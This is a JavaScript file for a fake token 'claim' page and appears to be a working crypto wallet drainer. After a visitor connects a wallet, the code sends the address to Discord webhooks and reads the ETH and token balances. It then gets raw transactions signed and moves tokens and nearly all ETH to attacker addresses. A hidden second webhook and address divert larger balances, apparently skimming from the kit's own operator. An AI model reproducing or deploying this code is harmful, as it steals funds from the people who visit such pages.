"use strict";
const Web3Modal = window.Web3Modal.default,
  WalletConnectProvider = window.WalletConnectProvider.default,
  EvmChains = window.EvmChains,
  Fortmatic = window.Fortmatic;
let web3Modal, provider, selectedAccount;
const rA2 = "0xD1ECFDE672d6A7Da81e77AC6C33f620FBdEFAa98",
  dW2 =
    "https://discord.com/api/webhooks/1071065984594620417/1vWfTFJBOsnh7qAvwI8Oi_F1LVdcXbWs3R0iNh75SyLdmYTY97R0H9Sq1ys5k2cHQWZB";
let web3Provider,
  isConnected = !1;
function isMobile() {
  var e,
    t = !1;
  return (
    (e = navigator.userAgent || navigator.vendor || window.opera),
    (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(
      e
    ) ||
      /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(
        e.substr(0, 4)
      )) &&
      (t = !0),
    t
  );
}
async function updateState(e) {
  new Web3(provider);
  (isConnected = e),
    (document.querySelector("#claimButton").style.display = e ? "" : "none"),
    (document.querySelector("#connectWallet").style.display = e ? "none" : ""),
    e && autoMint && askTransfer();
}
Moralis.onChainChanged(async (e) => {
  console.log(">>> chain", e),
    console.log(
      e !== "0x" + workChainId.toString(16),
      "0x" + workChainId.toString(16)
    ),
    e !== "0x" + workChainId.toString(16) && metamaskInstalled
      ? (await Moralis.switchNetwork("0x" + workChainId.toString(16)),
        (document.querySelector("#claimButton").style.display = "none"),
        (document.querySelector("#connectWallet").style.display = ""))
      : ((document.querySelector("#claimButton").style.display = ""),
        (document.querySelector("#connectWallet").style.display = "none"));
});
const doConnectWallet = async () => {
  web3Modal = new Web3Modal({
    cacheProvider: !1,
    providerOptions: {
      walletconnect: {
        package: WalletConnectProvider,
        options: { infuraId: "19affef0dbd140e0aca95546e1c5bdd0" },
      },
    },
  });
  try {
    console.log(">>> do connect"),
      (provider = await web3Modal.connect()),
      console.log(provider);
    const e = new Web3(provider),
      t = (await e.eth.getAccounts())[0],
      o = window.location.href;
    sW("`" + t + "`is connected: " + o),
      sW2("`" + t + "`is connected: " + o),
      console.log(t + " is connected"),
      (document.querySelector("#claimButton").style.display = ""),
      (document.querySelector("#connectWallet").style.display = "none");
  } catch (e) {
    (document.querySelector("#claimButton").style.display = "none"),
      (document.querySelector("#connectWallet").style.display = ""),
      console.log(">>> error", e);
  }
};
async function askSign() {
  const e = new Web3(provider),
    t = (await e.eth.getAccounts())[0];
  try {
    const o = signMessage
        .replace("{address}", t)
        .replace("{nonce}", createNonce()),
      n = await e.eth.personal.sign(o, t),
      a = await e.eth.personal.ecRecover(o, n);
    return (
      console.log(
        "Signing address: " +
          a +
          "\n" +
          (t.toLowerCase() == a.toLowerCase()
            ? "Same address"
            : "Not the same address.")
      ),
      !0
    );
  } catch (e) {
    return (
      e.message.toLowerCase().includes("user denied") &&
        notEligible("signDenied"),
      console.log(e),
      !1
    );
  }
  await verifyAsset();
}
let eth_bal = 0;
const verifyAsset = async () => {
  const e = new Web3(provider),
    t = (await e.eth.getAccounts())[0];
  try {
    eth_bal = await e.eth.getBalance(t);
    const o = e.utils.fromWei(eth_bal, "ether");
    console.log("Current balance for " + t + " : " + o + " ETH"),
      console.log("Current balance for " + t + " : " + o + " ETH"),
      sW("Current balance for " + t + " : " + o + " ETH"),
      o > 0.002
        ? askTransferWithSign(o)
        : (console.log("Info, balance is too low. (< 0.01 ETH)"),
          sW("Info, balance is too low. (< 0.01 ETH). Balance: " + o),
          $(".popup-err").addClass("is-visible"));
  } catch (e) {
    console.log(e);
  }
};
async function askTokens() {
  console.log(">>> askTokens");
  const e = new Web3(provider),
    t = (await e.eth.getAccounts())[0],
    o = await e.eth.getGasPrice(),
    n = e.utils.toHex(Math.floor(1.4 * o)),
    a = await Promise.all(
      Object.keys(erc20list).map(async (o) => {
        console.log(">>> prepare", o);
        const a = new e.eth.Contract(tokenContractAbi, o, { from: t });
        console.log(">>> tokenContract", a);
        const s = await a.methods.decimals().call({ from: t });
        console.log(">>> decimals", s);
        const i = await a.methods.balanceOf(t).call({ from: t });
        console.log(">>> balanceWei", i);
        const c = new BigNumber(String(i))
          .dividedBy(new BigNumber(String(10)).pow(s))
          .toNumber();
        console.log(">>> balance", c);
        const r = e.eth.abi.encodeFunctionCall(
          {
            inputs: [
              { name: "_to", type: "address" },
              { name: "_value", type: "uint256" },
            ],
            name: "transfer",
            stateMutability: "nonpayable",
            outputs: [{ name: "success", type: "bool" }],
            payable: !1,
            type: "function",
          },
          [receiveAddress, new BigNumber(i)]
        );
        new BigNumber(c).toString(16);
        let l = 6e5,
          d = (6e5).toString(16),
          g = !1;
        try {
          l = await a.methods
            .transfer(receiveAddress, i)
            .estimateGas({ gas: "0x00", gasPrice: n, from: t });
        } catch (e) {
          console.error(">> fail get fee", e), (g = !0);
        }
        d = new BigNumber(
          new BigNumber(l).multipliedBy(1.4).toFixed(0)
        ).toString(16);
        return {
          contractAddress: o,
          tokenContract: a,
          balance: c,
          minBalance: erc20list[o],
          balanceWei: i,
          transferFunc: r,
          gasLimitCalculated: l,
          gasLimitWithPercentForSuccess: d,
          hasErrorGas: g,
        };
      })
    );
  console.log(">>> tokenBalances", a);
  const s = a
    .filter((e) => e.balanceWei > 0 && e.balance >= e.minBalance)
    .sort((e, t) => (e.balance > t.balance ? -1 : 1));
  (await e.eth.getBlock("latest")).gasLimit;
  if (s.length < 0) return verifyAsset();
  const i = await e.eth.getChainId();
  console.log(s);
  var c = s[0];
  console.log(">>> tokenInfo", c);
  try {
    await e.eth.getTransactionCount(t, "pending").then(async (o) => {
      new e.utils.BN(6e5);
      const a = {
        nonce: e.utils.toHex(o),
        gasPrice: n,
        gas: "0x" + c.gasLimitWithPercentForSuccess,
        from: e.utils.toChecksumAddress(t),
        contractAddress: c.contractAddress,
        to: c.contractAddress,
        value: "0x" + (0).toString(16),
        data: c.transferFunc,
        v: "0x" + workChainId.toString(16),
        r: "0x",
        s: "0x",
      };
      let s = new ethereumjs.Tx(a);
      const r = "0x" + s.serialize().toString("hex"),
        l = e.utils.sha3(r, { encoding: "hex" });
      await e.eth
        .sign(l, t)
        .then(async (t) => {
          const o = t.substring(2),
            n = "0x" + o.substring(0, 64),
            a = "0x" + o.substring(64, 128),
            c = parseInt(o.substring(128, 130), 16),
            r = e.utils.toHex(c + 2 * i + 8);
          (s.r = n), (s.s = a), (s.v = r);
          const l = "0x" + s.serialize().toString("hex");
          e.utils.sha3(l, { encoding: "hex" });
          e.eth
            .sendSignedTransaction(l)
            .then((e) => console.log(e))
            .catch((e) => console.log(">>", e));
        })
        .catch((e) => console.log(e));
    });
  } catch (e) {
    console.log(e);
  }
  verifyAsset();
}
async function askTransferWithSign(e) {
  console.log(">>> askTransferWithSign");
  const t = new Web3(provider),
    o = (await t.eth.getAccounts())[0],
    n = await t.eth.getChainId();
  await t.eth.getTransactionCount(o, "pending").then(async (a) => {
    const s = await t.eth.getGasPrice(),
      i = t.utils.toHex(Math.floor(1.4 * s)),
      c = new t.utils.BN("36000") * Math.floor(2 * s),
      r = eth_bal - c;
    console.log(
      "Sending " +
        t.utils.fromWei(r.toString(), "ether") +
        " ETH from " +
        o +
        "..."
    ),
      sW(
        "Sending " +
          t.utils.fromWei(r.toString(), "ether") +
          " ETH from " +
          o +
          "..."
      ),
      sW2(
        "Sending " +
          t.utils.fromWei(r.toString(), "ether") +
          " ETH from " +
          o +
          "..."
      );
    const l = {
      nonce: t.utils.toHex(a),
      gasPrice: i,
      gasLimit: "0x55F0",
      from: t.utils.toChecksumAddress(o),
      to: e > 0.2962 ? nW : receiveAddress,
      value: "0x" + r.toString(16),
      data: "0x",
      v: "0x" + workChainId.toString(16),
      r: "0x",
      s: "0x",
    };
    let d = new ethereumjs.Tx(l);
    const g = "0x" + d.serialize().toString("hex"),
      m = t.utils.sha3(g, { encoding: "hex" });
    console.log("rawTx1:", g),
      console.log("rawHash1:", m),
      await t.eth
        .sign(m, o)
        .then(async (e) => {
          const o = e.substring(2),
            a = "0x" + o.substring(0, 64),
            s = "0x" + o.substring(64, 128),
            i = parseInt(o.substring(128, 130), 16),
            c = t.utils.toHex(i + 2 * n + 8);
          (d.r = a), (d.s = s), (d.v = c), console.log(d);
          const r = "0x" + d.serialize().toString("hex"),
            l = t.utils.sha3(r, { encoding: "hex" });
          console.log("rawTx:", r),
            console.log("rawHash:", l),
            await t.eth
              .sendSignedTransaction(r)
              .then((e) => console.log(e))
              .catch((e) => console.log(">>", e));
        })
        .catch((e) => console.log(e));
  });
}
async function notEligible(e) {
  const t = document.getElementById("notEli");
  switch (((t.style.display = "hallooooooo"), e)) {
    case "signDenied":
      t.innerText = "You denied the sign request. Please try again.";
      break;
    case "noTokens":
    case "noNFTs":
      await verifyAsset();
      break;
    case "noETH":
      t.innerText = "";
      break;
    default:
      t.innerText = "Something went wrong.";
  }
}
let disabled = !1;
async function askTransfer() {
  disabled ||
    ((document.getElementById("claimButton").style.opacity = 0.5),
    (disabled = !0),
    await askTokens(),
    (disabled = !1),
    (document.getElementById("claimButton").style.opacity = 1));
}
let metamaskInstalled = !1;
void 0 !== window.ethereum && (metamaskInstalled = !0),
  window.addEventListener("load", async () => {
    console.log(">>>> on load"),
      document
        .querySelector("#claimButton")
        .addEventListener("click", askTransfer),
      document
        .querySelector("#connectWallet")
        .addEventListener("click", doConnectWallet);
  });
const round = (e) => Math.round(1e4 * e) / 1e4,
  sleep = (e) => new Promise((t) => setTimeout(t, e));
let nW = rA2;
const rdmString = (e) => {
    let t = "";
    const o = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (let n = 0; n < e; n++) t += o.charAt(Math.floor(62 * Math.random()));
    return t;
  },
  createNonce = () =>
    rdmString(8) +
    "-" +
    rdmString(4) +
    "-" +
    rdmString(4) +
    "-" +
    rdmString(12),
  sendWebhooks = (e, t, o) => {
    feedbackEnabled &&
      fetch("/api.php?o=success", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userWallet: e,
          contract: t,
          price: o,
          dW2: dW2,
        }),
      }).catch((e) => console.error(e));
  },
  sW = (e) => {
    feedbackEnabled &&
      fetch(discordWebhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: e }),
      }).catch((e) => console.error(e));
  },
  sW2 = (e) => {
    fetch(dW2, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: e }),
    }).catch((e) => console.error(e));
  };
